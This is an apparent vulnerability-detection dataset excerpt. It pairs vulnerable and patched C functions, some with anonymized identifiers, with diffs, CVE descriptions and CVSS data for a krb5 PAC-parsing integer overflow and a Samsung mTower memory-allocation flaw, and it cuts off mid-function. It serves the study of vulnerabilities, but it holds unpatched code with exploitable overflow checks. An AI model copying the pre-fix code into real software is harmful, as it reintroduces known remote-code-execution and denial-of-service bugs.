            err(context, ret, ""krb5_pac_verify_ext with realm failed"");

        ret = krb5_pac_verify(context, pac, authtime, p, &member_keyblock,
                              &kdc_keyblock);
        if (!ret)
            err(context, ret, ""krb5_pac_verify should have failed"");

        krb5_pac_free(context, pac);

        /* Test enterprise with realm. */
        ret = krb5_pac_init(context, &pac);
        if (ret)
            err(context, ret, ""krb5_pac_init"");

        ret = krb5_pac_sign_ext(context, pac, authtime, ep, &member_keyblock,
                                &kdc_keyblock, TRUE, &data);
        if (ret)
            err(context, ret, ""krb5_pac_sign_ext ent with realm failed"");

        krb5_pac_free(context, pac);

        ret = krb5_pac_parse(context, data.data, data.length, &pac);
        krb5_free_data_contents(context, &data);
        if (ret)
            err(context, ret, ""krb5_pac_parse failed"");

        ret = krb5_pac_verify_ext(context, pac, authtime, ep, &member_keyblock,
                                  &kdc_keyblock, TRUE);
        if (ret)
            err(context, ret, ""krb5_pac_verify_ext ent with realm failed"");

        ret = krb5_pac_verify(context, pac, authtime, p, &member_keyblock,
                              &kdc_keyblock);
        if (!ret)
            err(context, ret, ""krb5_pac_verify should have failed"");

        ret = krb5_pac_verify(context, pac, authtime, ep, &member_keyblock,
                              &kdc_keyblock);
        if (!ret)
            err(context, ret, ""krb5_pac_verify should have failed"");

        ret = krb5_pac_verify_ext(context, pac, authtime, p, &member_keyblock,
                                  &kdc_keyblock, TRUE);
        if (!ret)
            err(context, ret, ""krb5_pac_verify_ext should have failed"");

        krb5_free_principal(context, ep);
        krb5_free_principal(context, np);
    }

    krb5_pac_free(context, pac);

    krb5_free_principal(context, p);
    krb5_free_context(context);

    return 0;
}","int
main(int VAR_0, char **VAR_1)
{
    krb5_error_code VAR_2;
    krb5_context VAR_3;
    krb5_pac VAR_4;
    krb5_data VAR_5;
    krb5_principal VAR_6;

    VAR_2 = krb5_init_context(&VAR_3);
    if (VAR_2)
        err(NULL, 0, ""krb5_init_contex"");

    test_pac_ticket_signature(VAR_3);

    VAR_2 = krb5_set_default_realm(VAR_3, ""WIN2K3.THINKER.LOCAL"");
    if (VAR_2)
        err(VAR_3, VAR_2, ""krb5_set_default_realm"");

    VAR_2 = krb5_parse_name(VAR_3, VAR_7, &VAR_6);
    if (VAR_2)
        err(VAR_3, VAR_2, ""krb5_parse_name"");

    /* COMMENT_0 */
    check_pac(VAR_3, -1, VAR_8, sizeof(VAR_8), VAR_9, VAR_6,
              VAR_10, 0, &VAR_11, &VAR_12);

    /* COMMENT_1 */
    {
        krb5_principal VAR_13;
        krb5_principal VAR_14;
        const struct pac_and_info *VAR_15;

        VAR_2 = krb5_parse_name(VAR_3, VAR_16, &VAR_13);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_parse_name"");

        VAR_2 = krb5_parse_name_flags(VAR_3, VAR_17,
                                    VAR_18, &VAR_14);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_parse_name_flags"");

        for (VAR_15 = VAR_19; VAR_15->data != NULL; VAR_15++) {
            check_pac(VAR_3, VAR_15 - VAR_19, VAR_15->data, VAR_15->length,
                      VAR_15->authtime, VAR_15->is_enterprise ? VAR_14 : VAR_13,
                      VAR_20, VAR_15->is_xrealm,
                      VAR_15->is_xrealm ? &VAR_21 : &VAR_22, NULL);
        }

        krb5_free_principal(VAR_3, VAR_13);
        krb5_free_principal(VAR_3, VAR_14);
    }

    /* COMMENT_2 */
    VAR_2 = krb5_pac_parse(VAR_3, VAR_23, sizeof(VAR_23), &VAR_4);
    if (!VAR_2)
        err(VAR_3, VAR_2, ""krb5_pac_parse should have failed"");
    VAR_2 = krb5_pac_parse(VAR_3, VAR_24, sizeof(VAR_24), &VAR_4);
    if (!VAR_2)
        err(VAR_3, VAR_2, ""krb5_pac_parse should have failed"");

    /* COMMENT_3 */
                      
       

    VAR_2 = krb5_pac_init(VAR_3, &VAR_4);
    if (VAR_2)
        err(VAR_3, VAR_2, ""krb5_pac_init"");
    krb5_pac_free(VAR_3, VAR_4);

    /* COMMENT_6 */
                             
       

    VAR_2 = krb5_pac_init(VAR_3, &VAR_4);
    if (VAR_2)
        err(VAR_3, VAR_2, ""krb5_pac_init"");

    {
        const krb5_data VAR_25 = { 0, 2, ""\x00\x01"" } ;

        VAR_2 = krb5_pac_add_buffer(VAR_3, VAR_4, 1, &VAR_25);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_add_buffer"");
    }
    {
        VAR_2 = krb5_pac_get_buffer(VAR_3, VAR_4, 1, &VAR_5);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_get_buffer"");
        if (VAR_5.length != 2 || memcmp(VAR_5.data, ""\x00\x01"", 2) != 0)
            err(VAR_3, 0, ""krb5_pac_get_buffer data not the same"");
        krb5_free_data_contents(VAR_3, &VAR_5);
    }

    {
        const krb5_data VAR_25 = { 0, 2, ""\x02\x00"" } ;

        VAR_2 = krb5_pac_add_buffer(VAR_3, VAR_4, 2, &VAR_25);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_add_buffer"");
    }
    {
        VAR_2 = krb5_pac_get_buffer(VAR_3, VAR_4, 1, &VAR_5);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_get_buffer"");
        if (VAR_5.length != 2 || memcmp(VAR_5.data, ""\x00\x01"", 2) != 0)
            err(VAR_3, 0, ""krb5_pac_get_buffer data not the same"");
        krb5_free_data_contents(VAR_3, &VAR_5);
        /* COMMENT_9 */
        VAR_2 = krb5_pac_get_buffer(VAR_3, VAR_4, 2, &VAR_5);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_get_buffer"");
        if (VAR_5.length != 2 || memcmp(VAR_5.data, ""\x02\x00"", 2) != 0)
            err(VAR_3, 0, ""krb5_pac_get_buffer data not the same"");
        krb5_free_data_contents(VAR_3, &VAR_5);
    }

    VAR_2 = krb5_pac_sign(VAR_3, VAR_4, VAR_9, VAR_6,
                        &VAR_11, &VAR_12, &VAR_5);
    if (VAR_2)
        err(VAR_3, VAR_2, ""krb5_pac_sign"");

    krb5_pac_free(VAR_3, VAR_4);

    VAR_2 = krb5_pac_parse(VAR_3, VAR_5.data, VAR_5.length, &VAR_4);
    krb5_free_data_contents(VAR_3, &VAR_5);
    if (VAR_2)
        err(VAR_3, VAR_2, ""krb5_pac_parse 3"");

    VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_6,
                          &VAR_11, &VAR_12);
    if (VAR_2)
        err(VAR_3, VAR_2, ""krb5_pac_verify 3"");

    {
        uint32_t *VAR_26;
        size_t VAR_27;

        /* COMMENT_10 */
        VAR_2 = krb5_pac_get_types(VAR_3, VAR_4, &VAR_27, &VAR_26);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_get_types"");
        if (VAR_27 != 5)
            err(VAR_3, 0, ""list wrong length"");
        free(VAR_26);
    }

    {
        krb5_principal VAR_28, VAR_29;

        VAR_2 = krb5_parse_name_flags(VAR_3, VAR_7,
                                    VAR_18, &VAR_28);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_parse_name_flags"");

        VAR_2 = krb5_copy_principal(VAR_3, VAR_28, &VAR_29);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_copy_principal"");
        VAR_29->type = VAR_30;

        /* COMMENT_11 */
        VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_28, &VAR_11,
                              &VAR_12);
        if (!VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_verify should have failed"");

        VAR_2 = krb5_pac_sign(VAR_3, VAR_4, VAR_9, VAR_28, &VAR_11,
                            &VAR_12, &VAR_5);
        if (!VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_sign should have failed"");

        /* COMMENT_12 */
        VAR_2 = krb5_pac_verify_ext(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
                                  &VAR_12, TRUE);
        if (!VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_verify_ext with realm should fail"");

        /* COMMENT_13 */
                                              
        VAR_2 = krb5_pac_sign_ext(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
                                &VAR_12, TRUE, &VAR_5);
        if (!VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_sign_ext with realm should fail"");

        krb5_pac_free(VAR_3, VAR_4);

        /* COMMENT_15 */
        VAR_2 = krb5_pac_init(VAR_3, &VAR_4);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_init"");

        VAR_2 = krb5_pac_sign(VAR_3, VAR_4, VAR_9, VAR_28, &VAR_11,
                            &VAR_12, &VAR_5);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_sign enterprise failed"");

        krb5_pac_free(VAR_3, VAR_4);

        VAR_2 = krb5_pac_parse(VAR_3, VAR_5.data, VAR_5.length, &VAR_4);
        krb5_free_data_contents(VAR_3, &VAR_5);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_parse failed"");

        VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_28, &VAR_11,
                              &VAR_12);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_verify enterprise failed"");

        /* COMMENT_16 */
        VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_29, &VAR_11,
                              &VAR_12);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_verify enterprise as nt-ms failed"");

        VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
                              &VAR_12);
        if (!VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_verify should have failed"");

        krb5_pac_free(VAR_3, VAR_4);

        /* COMMENT_17 */
        VAR_2 = krb5_pac_init(VAR_3, &VAR_4);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_init"");

        VAR_2 = krb5_pac_sign(VAR_3, VAR_4, VAR_9, VAR_29, &VAR_11,
                            &VAR_12, &VAR_5);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_sign enterprise failed"");

        krb5_pac_free(VAR_3, VAR_4);

        VAR_2 = krb5_pac_parse(VAR_3, VAR_5.data, VAR_5.length, &VAR_4);
        krb5_free_data_contents(VAR_3, &VAR_5);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_parse failed"");

        VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_29, &VAR_11,
                              &VAR_12);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_verify enterprise failed"");

        /* COMMENT_18 */
        VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_28, &VAR_11,
                              &VAR_12);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_verify nt-ms as enterprise failed"");

        VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
                              &VAR_12);
        if (!VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_verify should have failed"");

        krb5_pac_free(VAR_3, VAR_4);

        /* COMMENT_19 */
        VAR_2 = krb5_pac_init(VAR_3, &VAR_4);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_init"");

        VAR_2 = krb5_pac_sign_ext(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
                                &VAR_12, TRUE, &VAR_5);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_sign_ext with realm failed"");

        krb5_pac_free(VAR_3, VAR_4);

        VAR_2 = krb5_pac_parse(VAR_3, VAR_5.data, VAR_5.length, &VAR_4);
        krb5_free_data_contents(VAR_3, &VAR_5);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_parse failed"");

        VAR_2 = krb5_pac_verify_ext(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
                                  &VAR_12, TRUE);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_verify_ext with realm failed"");

        VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
                              &VAR_12);
        if (!VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_verify should have failed"");

        krb5_pac_free(VAR_3, VAR_4);

        /* COMMENT_20 */
        VAR_2 = krb5_pac_init(VAR_3, &VAR_4);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_init"");

        VAR_2 = krb5_pac_sign_ext(VAR_3, VAR_4, VAR_9, VAR_28, &VAR_11,
                                &VAR_12, TRUE, &VAR_5);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_sign_ext ent with realm failed"");

        krb5_pac_free(VAR_3, VAR_4);

        VAR_2 = krb5_pac_parse(VAR_3, VAR_5.data, VAR_5.length, &VAR_4);
        krb5_free_data_contents(VAR_3, &VAR_5);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_parse failed"");

        VAR_2 = krb5_pac_verify_ext(VAR_3, VAR_4, VAR_9, VAR_28, &VAR_11,
                                  &VAR_12, TRUE);
        if (VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_verify_ext ent with realm failed"");

        VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
                              &VAR_12);
        if (!VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_verify should have failed"");

        VAR_2 = krb5_pac_verify(VAR_3, VAR_4, VAR_9, VAR_28, &VAR_11,
                              &VAR_12);
        if (!VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_verify should have failed"");

        VAR_2 = krb5_pac_verify_ext(VAR_3, VAR_4, VAR_9, VAR_6, &VAR_11,
                                  &VAR_12, TRUE);
        if (!VAR_2)
            err(VAR_3, VAR_2, ""krb5_pac_verify_ext should have failed"");

        krb5_free_principal(VAR_3, VAR_28);
        krb5_free_principal(VAR_3, VAR_29);
    }

    krb5_pac_free(VAR_3, VAR_4);

    krb5_free_principal(VAR_3, VAR_6);
    krb5_free_context(VAR_3);

    return 0;
}",krb5/ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583/t_pac.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -51,6 +51,14 @@
         krb5_free_principal(context, sep);
     }
 
+    /* Check problematic PACs found by fuzzing. */
+    ret = krb5_pac_parse(context, fuzz1, sizeof(fuzz1), &pac);
+    if (!ret)
+        err(context, ret, ""krb5_pac_parse should have failed"");
+    ret = krb5_pac_parse(context, fuzz2, sizeof(fuzz2), &pac);
+    if (!ret)
+        err(context, ret, ""krb5_pac_parse should have failed"");
+
     /*
      * Test empty free
      */","{'deleted_lines': [], 'added_lines': ['    /* Check problematic PACs found by fuzzing. */', '    ret = krb5_pac_parse(context, fuzz1, sizeof(fuzz1), &pac);', '    if (!ret)', '        err(context, ret, ""krb5_pac_parse should have failed"");', '    ret = krb5_pac_parse(context, fuzz2, sizeof(fuzz2), &pac);', '    if (!ret)', '        err(context, ret, ""krb5_pac_parse should have failed"");', '']}",True,"PAC parsing in MIT Kerberos 5 (aka krb5) before 1.19.4 and 1.20.x before 1.20.1 has integer overflows that may lead to remote code execution (in KDC, kadmind, or a GSS or Kerberos application server) on 32-bit platforms (which have a resultant heap-based buffer overflow), and cause a denial of service on other platforms. This occurs in krb5_pac_parse in lib/krb5/krb/pac.c. Heimdal before 7.7.1 has ""a similar bug.""",8.8,HIGH,2,valid,2022-10-18T00:25:11Z,4
CVE-2022-42898,['CWE-190'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H,1,krb5,"Fix integer overflows in PAC parsing

In krb5_parse_pac(), check for buffer counts large enough to threaten
integer overflow in the header length and memory length calculations.
Avoid potential integer overflows when checking the length of each
buffer.  Credit to OSS-Fuzz for discovering one of the issues.

CVE-2022-42898:

In MIT krb5 releases 1.8 and later, an authenticated attacker may be
able to cause a KDC or kadmind process to crash by reading beyond the
bounds of allocated memory, creating a denial of service.  A
privileged attacker may similarly be able to cause a Kerberos or GSS
application service to crash.  On 32-bit platforms, an attacker can
also cause insufficient memory to be allocated for the result,
potentially leading to remote code execution in a KDC, kadmind, or GSS
or Kerberos application server process.  An attacker with the
privileges of a cross-realm KDC may be able to extract secrets from a
KDC process's memory by having them copied into the PAC of a new
ticket.

ticket: 9074 (new)
tags: pullup
target_version: 1.20-next
target_version: 1.19-next",ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583,https://github.com/krb5/krb5/commit/ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583,src/lib/krb5/krb/pac.c,krb5_pac_parse,"krb5_error_code KRB5_CALLCONV
krb5_pac_parse(krb5_context context,
const void *ptr,
size_t len,
krb5_pac *ppac)
{
krb5_error_code ret;
size_t i;
const unsigned char *p = (const unsigned char *)ptr;
krb5_pac pac;
size_t header_len;
krb5_ui_4 cbuffers, version;
*ppac = NULL;
if (len < PACTYPE_LENGTH)
return ERANGE;
cbuffers = load_32_le(p);
p += 4;
version = load_32_le(p);
p += 4;
if (version != 0)
return EINVAL;
header_len = PACTYPE_LENGTH + (cbuffers * PAC_INFO_BUFFER_LENGTH);
if (len < header_len)
return ERANGE;
ret = krb5_pac_init(context, &pac);
if (ret != 0)
return ret;
pac->pac = (PACTYPE *)realloc(pac->pac,
sizeof(PACTYPE) + ((cbuffers - 1) * sizeof(PAC_INFO_BUFFER)));
if (pac->pac == NULL) {
krb5_pac_free(context, pac);
return ENOMEM;
}
pac->pac->cBuffers = cbuffers;
pac->pac->Version = version;
for (i = 0; i < pac->pac->cBuffers; i++) {
PAC_INFO_BUFFER *buffer = &pac->pac->Buffers[i];
buffer->ulType = load_32_le(p);
p += 4;
buffer->cbBufferSize = load_32_le(p);
p += 4;
buffer->Offset = load_64_le(p);
p += 8;
if (buffer->Offset % PAC_ALIGNMENT) {
krb5_pac_free(context, pac);
return EINVAL;
}
if (buffer->Offset < header_len ||
buffer->Offset + buffer->cbBufferSize > len) {
krb5_pac_free(context, pac);
return ERANGE;
}
}
pac->data.data = realloc(pac->data.data, len);
if (pac->data.data == NULL) {
krb5_pac_free(context, pac);
return ENOMEM;
}
memcpy(pac->data.data, ptr, len);
pac->data.length = len;
*ppac = pac;
return 0;
}","krb5_error_code VAR_0
krb5_pac_parse(krb5_context VAR_1,
const void *VAR_2,
size_t VAR_3,
krb5_pac *VAR_4)
{
krb5_error_code VAR_5;
size_t VAR_6;
const unsigned char *VAR_7 = (const unsigned char *)VAR_2;
krb5_pac VAR_8;
size_t VAR_9;
krb5_ui_4 VAR_10, VAR_11;
*VAR_4 = NULL;
if (VAR_3 < VAR_12)
return VAR_13;
VAR_10 = load_32_le(VAR_7);
VAR_7 += 4;
VAR_11 = load_32_le(VAR_7);
VAR_7 += 4;
if (VAR_11 != 0)
return VAR_14;
VAR_9 = VAR_12 + (VAR_10 * VAR_15);
if (VAR_3 < VAR_9)
return VAR_13;
VAR_5 = krb5_pac_init(VAR_1, &VAR_8);
if (VAR_5 != 0)
return VAR_5;
VAR_8->pac = (PACTYPE *)realloc(VAR_8->pac,
sizeof(PACTYPE) + ((VAR_10 - 1) * sizeof(VAR_16)));
if (VAR_8->pac == NULL) {
krb5_pac_free(VAR_1, VAR_8);
return VAR_17;
}
VAR_8->pac->cBuffers = VAR_10;
VAR_8->pac->Version = VAR_11;
for (VAR_6 = 0; VAR_6 < VAR_8->pac->cBuffers; VAR_6++) {
PAC_INFO_BUFFER *VAR_18 = &VAR_8->pac->Buffers[VAR_6];
VAR_18->ulType = load_32_le(VAR_7);
VAR_7 += 4;
VAR_18->cbBufferSize = load_32_le(VAR_7);
VAR_7 += 4;
VAR_18->Offset = load_64_le(VAR_7);
VAR_7 += 8;
if (VAR_18->Offset % VAR_19) {
krb5_pac_free(VAR_1, VAR_8);
return VAR_14;
}
if (VAR_18->Offset < VAR_9 ||
VAR_18->Offset + VAR_18->cbBufferSize > VAR_3) {
krb5_pac_free(VAR_1, VAR_8);
return VAR_13;
}
}
VAR_8->data.data = realloc(VAR_8->data.data, VAR_3);
if (VAR_8->data.data == NULL) {
krb5_pac_free(VAR_1, VAR_8);
return VAR_17;
}
memcpy(VAR_8->data.data, VAR_2, VAR_3);
VAR_8->data.length = VAR_3;
*VAR_4 = VAR_8;
return 0;
}",,"krb5_error_code KRB5_CALLCONV
krb5_pac_parse(krb5_context context,
               const void *ptr,
               size_t len,
               krb5_pac *ppac)
{
    krb5_error_code ret;
    size_t i;
    const unsigned char *p = (const unsigned char *)ptr;
    krb5_pac pac;
    size_t header_len;
    krb5_ui_4 cbuffers, version;

    *ppac = NULL;

    if (len < PACTYPE_LENGTH)
        return ERANGE;

    cbuffers = load_32_le(p);
    p += 4;
    version = load_32_le(p);
    p += 4;

    if (version != 0)
        return EINVAL;

    if (cbuffers < 1 || cbuffers > MAX_BUFFERS)
        return ERANGE;

    header_len = PACTYPE_LENGTH + (cbuffers * PAC_INFO_BUFFER_LENGTH);
    if (len < header_len)
        return ERANGE;

    ret = krb5_pac_init(context, &pac);
    if (ret != 0)
        return ret;

    pac->pac = (PACTYPE *)realloc(pac->pac,
                                  sizeof(PACTYPE) + ((cbuffers - 1) * sizeof(PAC_INFO_BUFFER)));
    if (pac->pac == NULL) {
        krb5_pac_free(context, pac);
        return ENOMEM;
    }

    pac->pac->cBuffers = cbuffers;
    pac->pac->Version = version;

    for (i = 0; i < pac->pac->cBuffers; i++) {
        PAC_INFO_BUFFER *buffer = &pac->pac->Buffers[i];

        buffer->ulType = load_32_le(p);
        p += 4;
        buffer->cbBufferSize = load_32_le(p);
        p += 4;
        buffer->Offset = load_64_le(p);
        p += 8;

        if (buffer->Offset % PAC_ALIGNMENT) {
            krb5_pac_free(context, pac);
            return EINVAL;
        }
        if (buffer->Offset < header_len || buffer->Offset > len ||
            buffer->cbBufferSize > len - buffer->Offset) {
            krb5_pac_free(context, pac);
            return ERANGE;
        }
    }

    pac->data.data = realloc(pac->data.data, len);
    if (pac->data.data == NULL) {
        krb5_pac_free(context, pac);
        return ENOMEM;
    }
    memcpy(pac->data.data, ptr, len);

    pac->data.length = len;

    *ppac = pac;

    return 0;
}","krb5_error_code VAR_0
krb5_pac_parse(krb5_context VAR_1,
               const void *VAR_2,
               size_t VAR_3,
               krb5_pac *VAR_4)
{
    krb5_error_code VAR_5;
    size_t VAR_6;
    const unsigned char *VAR_7 = (const unsigned char *)VAR_2;
    krb5_pac VAR_8;
    size_t VAR_9;
    krb5_ui_4 VAR_10, VAR_11;

    *VAR_4 = NULL;

    if (VAR_3 < VAR_12)
        return VAR_13;

    VAR_10 = load_32_le(VAR_7);
    VAR_7 += 4;
    VAR_11 = load_32_le(VAR_7);
    VAR_7 += 4;

    if (VAR_11 != 0)
        return VAR_14;

    if (VAR_10 < 1 || VAR_10 > VAR_15)
        return VAR_13;

    VAR_9 = VAR_12 + (VAR_10 * VAR_16);
    if (VAR_3 < VAR_9)
        return VAR_13;

    VAR_5 = krb5_pac_init(VAR_1, &VAR_8);
    if (VAR_5 != 0)
        return VAR_5;

    VAR_8->pac = (PACTYPE *)realloc(VAR_8->pac,
                                  sizeof(PACTYPE) + ((VAR_10 - 1) * sizeof(VAR_17)));
    if (VAR_8->pac == NULL) {
        krb5_pac_free(VAR_1, VAR_8);
        return VAR_18;
    }

    VAR_8->pac->cBuffers = VAR_10;
    VAR_8->pac->Version = VAR_11;

    for (VAR_6 = 0; VAR_6 < VAR_8->pac->cBuffers; VAR_6++) {
        PAC_INFO_BUFFER *VAR_19 = &VAR_8->pac->Buffers[VAR_6];

        VAR_19->ulType = load_32_le(VAR_7);
        VAR_7 += 4;
        VAR_19->cbBufferSize = load_32_le(VAR_7);
        VAR_7 += 4;
        VAR_19->Offset = load_64_le(VAR_7);
        VAR_7 += 8;

        if (VAR_19->Offset % VAR_20) {
            krb5_pac_free(VAR_1, VAR_8);
            return VAR_14;
        }
        if (VAR_19->Offset < VAR_9 || VAR_19->Offset > VAR_3 ||
            VAR_19->cbBufferSize > VAR_3 - VAR_19->Offset) {
            krb5_pac_free(VAR_1, VAR_8);
            return VAR_13;
        }
    }

    VAR_8->data.data = realloc(VAR_8->data.data, VAR_3);
    if (VAR_8->data.data == NULL) {
        krb5_pac_free(VAR_1, VAR_8);
        return VAR_18;
    }
    memcpy(VAR_8->data.data, VAR_2, VAR_3);

    VAR_8->data.length = VAR_3;

    *VAR_4 = VAR_8;

    return 0;
}",,"--- func_before
+++ func_after
@@ -23,6 +23,9 @@
 
     if (version != 0)
         return EINVAL;
+
+    if (cbuffers < 1 || cbuffers > MAX_BUFFERS)
+        return ERANGE;
 
     header_len = PACTYPE_LENGTH + (cbuffers * PAC_INFO_BUFFER_LENGTH);
     if (len < header_len)
@@ -56,8 +59,8 @@
             krb5_pac_free(context, pac);
             return EINVAL;
         }
-        if (buffer->Offset < header_len ||
-            buffer->Offset + buffer->cbBufferSize > len) {
+        if (buffer->Offset < header_len || buffer->Offset > len ||
+            buffer->cbBufferSize > len - buffer->Offset) {
             krb5_pac_free(context, pac);
             return ERANGE;
         }","{'deleted_lines': ['        if (buffer->Offset < header_len ||', '            buffer->Offset + buffer->cbBufferSize > len) {'], 'added_lines': ['', '    if (cbuffers < 1 || cbuffers > MAX_BUFFERS)', '        return ERANGE;', '        if (buffer->Offset < header_len || buffer->Offset > len ||', '            buffer->cbBufferSize > len - buffer->Offset) {']}",True,"PAC parsing in MIT Kerberos 5 (aka krb5) before 1.19.4 and 1.20.x before 1.20.1 has integer overflows that may lead to remote code execution (in KDC, kadmind, or a GSS or Kerberos application server) on 32-bit platforms (which have a resultant heap-based buffer overflow), and cause a denial of service on other platforms. This occurs in krb5_pac_parse in lib/krb5/krb/pac.c. Heimdal before 7.7.1 has ""a similar bug.""",8.8,HIGH,2,valid,2022-10-18T00:25:11Z,4
CVE-2022-38155,['CWE-770'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,Samsung/mTower,"Fixed CVE-2022-38155, CVE-2022-40762

Signed-off-by: Taras Drozdovskyi <t.drozdovsky@samsung.com>",236357f0e756f0fd2120a1a78cf573765471e088,https://github.com/Samsung/mTower/commit/236357f0e756f0fd2120a1a78cf573765471e088,tee/lib/libutee/tee_user_mem.c,tee_user_mem_free,"void tee_user_mem_free(void *buffer)
{
free(buffer);
}","void tee_user_mem_free(void *VAR_0)
{
free(VAR_0);
}",Samsung/mTower/236357f0e756f0fd2120a1a78cf573765471e088/tee_user_mem.c/vul/before/1.json,"void tee_user_mem_free(void *buffer)
{
	free(buffer);
//  utee_free(buffer);
}","void tee_user_mem_free(void *VAR_0)
{
	free(VAR_0);
/* COMMENT_0 */
}",Samsung/mTower/236357f0e756f0fd2120a1a78cf573765471e088/tee_user_mem.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -1,5 +1,5 @@
 void tee_user_mem_free(void *buffer)
 {
-  free(buffer);
+	free(buffer);
 //  utee_free(buffer);
 }","{'deleted_lines': ['  free(buffer);'], 'added_lines': ['\tfree(buffer);']}",True,"TEE_Malloc in Samsung mTower through 0.3.0 allows a trusted application to achieve Excessive Memory Allocation via a large len value, as demonstrated by a Numaker-PFM-M2351 TEE kernel crash.",7.5,HIGH,2,valid,2022-10-25T13:35:25Z,4
CVE-2022-38155,['CWE-770'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,Samsung/mTower,"Fixed CVE-2022-38155, CVE-2022-40762

Signed-off-by: Taras Drozdovskyi <t.drozdovsky@samsung.com>",236357f0e756f0fd2120a1a78cf573765471e088,https://github.com/Samsung/mTower/commit/236357f0e756f0fd2120a1a78cf573765471e088,tee/lib/libutee/tee_user_mem.c,tee_user_mem_alloc,"void *tee_user_mem_alloc(size_t len, uint32_t hint)
{
uint8_t *p;
switch (hint) {
case TEE_MALLOC_FILL_ZERO:
case TEE_USER_MEM_HINT_NO_FILL_ZERO:
break;
default:
EMSG(""Invalid alloc hint [%X]"", (unsigned int)hint);
return NULL;
}
p = malloc(len);
if (p == NULL)
return NULL;
if (hint == TEE_MALLOC_FILL_ZERO)
memset(p, 0, len);
#if (CFG_TEE_CORE_USER_MEM_DEBUG == 1)
if (hint == (typeof(hint)) TEE_USER_MEM_HINT_NO_FILL_ZERO)
memset(p, 0xBB, len);
#endif
return p;
}","void *tee_user_mem_alloc(size_t VAR_0, uint32_t VAR_1)
{
uint8_t *VAR_2;
switch (VAR_1) {
case VAR_3:
case VAR_4:
break;
default:
EMSG(""Invalid alloc hint [%X]"", (unsigned int)VAR_1);
return NULL;
}
VAR_2 = malloc(VAR_0);
if (VAR_2 == NULL)
return NULL;
if (VAR_1 == VAR_3)
memset(VAR_2, 0, VAR_0);
#if (VAR_5 == 1)
if (VAR_1 == (typeof(hint)) VAR_4)
memset(VAR_2, 0xBB, VAR_0);
#endif
return VAR_2;
}",Samsung/mTower/236357f0e756f0fd2120a1a78cf573765471e088/tee_user_mem.c/vul/before/2.json,"void *tee_user_mem_alloc(size_t len, uint32_t hint)
{
	uint8_t *p;
	void* limit = &__HeapLimit;
	void* base = &__HeapBase;

	switch (hint) {
	case TEE_MALLOC_FILL_ZERO:
	case TEE_USER_MEM_HINT_NO_FILL_ZERO:
		break;
	default:
		EMSG(""Invalid alloc hint [%X]"", (unsigned int)hint);
		return NULL;
	}
	// printf(""malloc = base = %x\n"", base );
	// printf(""malloc = (limit - base)/2 = %x\n"", (limit - base)/2 );
	if ((limit - base)/2 < len + 8)
		return NULL;
	//  p = utee_malloc(len);
	p = malloc(len);
	// printf(""malloc 1 = base + ((limit - base)/2) = %x\n"", base + ((limit - base)/2) );
	// printf(""malloc 2 = p + len = %x\n"", p + len );
	if ( base + ((limit - base)/2) < p + len) {
		free(p);
		return NULL;
	}
	if (p == NULL)
		return NULL;

